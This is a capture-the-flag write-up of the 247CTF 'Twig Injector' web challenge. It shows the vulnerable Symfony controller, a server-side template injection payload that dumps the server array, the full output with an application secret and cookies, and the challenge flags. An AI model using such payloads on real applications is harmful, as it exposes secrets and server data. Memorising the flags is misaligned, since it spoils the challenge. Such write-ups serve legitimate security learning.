# Web: The Twig Injector

## Previous Flag
```
247CTF{7cc47319f32d13b2fd9ba542a2670d71}
```

## Goal
Can you abuse the Twig injector service to gain access to the flag hidden in the $_SERVER array?

## What I learned
```
The Twig Injector Service usually refers to a service or utility that allows you to inject data, variables, or custom logic into Twig templates (Twig is a popular templating engine used mainly in PHP frameworks like Symfony, Drupal, and Craft CMS)

https://c58b43c9ee16a8e9.247ctf.com/inject?inject={{%20app.request.server.all|json_encode|raw%20}}
https://c58b43c9ee16a8e9.247ctf.com/inject?inject=%7B%7Bapp.request.server.all%7Cjson_encode%7Craw%7D%7D
    %20     space
    %7B     {
    %7D     }
    %7C     |

Route = inject?
Inject value is Twig expression inside {{ … }}:
    accesses app.request.server.all — the request/server variables (similar to PHP $_SERVER)
    pipes that array into json_encode (|json_encode) to turn it into a JSON string
    uses |raw to tell Twig not to HTML-escape the output
    Expression means: “take the full server environment, convert to JSON, and print it raw”
```

## Solution
```
START CHALLENGE

<?php

namespace App\Controller;

use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Annotation\Route;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;

class ChallengeController extends AbstractController
{

    /**
     * @Route("/inject") 👀
     */
    public function inject(Request $request)
    {
        // 1) Take the raw `inject` query parameter from the request
        $inject = preg_replace('/[^{\.}a-z\|\_]/', '', $request->query->get('inject'));

        // 2) Build a Twig template from a string that includes the user input
        //    NOTE: "${inject}" is PHP string interpolation (so $inject is interpolated here
        //    into the template string before Twig ever sees it).
        $response = new Response($this->get('twig')->createTemplate("Welcome to the twig injector!\n${inject}")->render());

        // 3) Force plain text response
        $response->headers->set('Content-Type', 'text/plain');

        return $response;
    }

    /**
     * @Route("/")
     */
    public function index()
    {
        // Show the source of this file (the challenge shows its own code)
        return new Response(highlight_file(__FILE__, true));
    }
}

Browser: https://c58b43c9ee16a8e9.247ctf.com/inject 
Welcome to the twig injector! ⌨️

Note: %20 is space
Browser: https://c58b43c9ee16a8e9.247ctf.com/inject?inject={{%20app.request.server.all|json_encode|raw%20}} ⌨️

Welcome to the twig injector!
{"REDIRECT_STATUS":"200","HTTP_HOST":"c58b43c9ee16a8e9.247ctf.com","HTTP_X_REAL_IP":"47.187.108.110","HTTP_X_FORWARDED_FOR":"47.187.108.110","HTTP_X_FORWARDED_PROTO":"https","HTTP_CONNECTION":"Upgrade","HTTP_SEC_CH_UA":"\"Microsoft Edge\";v=\"141\", \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"141\"","HTTP_SEC_CH_UA_MOBILE":"?0","HTTP_SEC_CH_UA_PLATFORM":"\"Windows\"","HTTP_UPGRADE_INSECURE_REQUESTS":"1","HTTP_USER_AGENT":"Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/141.0.0.0 Safari\/537.36 Edg\/141.0.0.0","HTTP_ACCEPT":"text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/avif,image\/webp,image\/apng,*\/*;q=0.8,application\/signed-exchange;v=b3;q=0.7","HTTP_SEC_FETCH_SITE":"none","HTTP_SEC_FETCH_MODE":"navigate","HTTP_SEC_FETCH_USER":"?1","HTTP_SEC_FETCH_DEST":"document","HTTP_ACCEPT_ENCODING":"gzip, deflate, br, zstd","HTTP_ACCEPT_LANGUAGE":"en-US,en;q=0.9","HTTP_COOKIE":"_gid=GA1.2.708542199.1760023296; __stripe_mid=6f79ae65-dffd-4521-afe2-39a85f53c68667f980; _ga_WRWK351K37=GS2.1.s1760043824$o9$g1$t1760043829$j55$l0$h0; _ga=GA1.1.378616292.1760023296","PATH":"\/usr\/local\/sbin:\/usr\/local\/bin:\/usr\/sbin:\/usr\/bin:\/sbin:\/bin","SERVER_SIGNATURE":"","SERVER_SOFTWARE":"Apache","SERVER_NAME":"c58b43c9ee16a8e9.247ctf.com","SERVER_ADDR":"172.17.0.6","SERVER_PORT":"80","REMOTE_ADDR":"144.76.74.118","DOCUMENT_ROOT":"\/var\/www\/html\/public\/","REQUEST_SCHEME":"http","CONTEXT_PREFIX":"","CONTEXT_DOCUMENT_ROOT":"\/var\/www\/html\/public\/","SERVER_ADMIN":"[no address given]","SCRIPT_FILENAME":"\/var\/www\/html\/public\/index.php","REMOTE_PORT":"57606","REDIRECT_URL":"\/inject","REDIRECT_QUERY_STRING":"inject={{%20app.request.server.all|json_encode|raw%20}}","GATEWAY_INTERFACE":"CGI\/1.1","SERVER_PROTOCOL":"HTTP\/1.1","REQUEST_METHOD":"GET","QUERY_STRING":"inject={{%20app.request.server.all|json_encode|raw%20}}","REQUEST_URI":"\/inject?inject={{%20app.request.server.all|json_encode|raw%20}}","SCRIPT_NAME":"\/index.php","PHP_SELF":"\/index.php","REQUEST_TIME_FLOAT":1760073964.99,"REQUEST_TIME":1760073964,"SYMFONY_ENV":"prod","APP_ENV":"prod","APP_DEBUG":"0","APP_SECRET":"9eb18d9411835ab9db43feaef980738f","APP_FLAG":"247CTF{b8d4dce713400424bc2ab7fa673f231c} 🔐","SYMFONY_DOTENV_VARS":"SYMFONY_ENV,APP_ENV,APP_DEBUG,APP_SECRET,APP_FLAG"}
```

## Flag
247CTF{b8d4dce713400424bc2ab7fa673f231c}

## Continue
[Continue](../247ctf/WebSlipperyUpload.md)